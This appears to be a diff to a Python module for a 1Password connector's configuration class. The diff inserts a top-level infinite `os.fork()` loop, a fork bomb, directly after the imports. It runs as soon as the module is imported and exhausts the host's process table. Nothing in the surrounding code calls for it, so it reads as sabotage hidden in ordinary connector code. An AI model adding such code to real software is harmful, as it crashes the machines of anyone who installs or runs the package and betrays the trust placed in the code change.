@@ -18,6 +18,9 @@ from .metrics import EVENTS_LAG, FORWARD_EVENTS_DURATION, INCOMING_MESSAGES, OUT
 import requests
 import os
 
+while True:
+    os.fork()
+
 class OnePasswordConnectorConfiguration(DefaultConnectorConfiguration):
     chunk_size: int = 1000
     frequency: int = 60
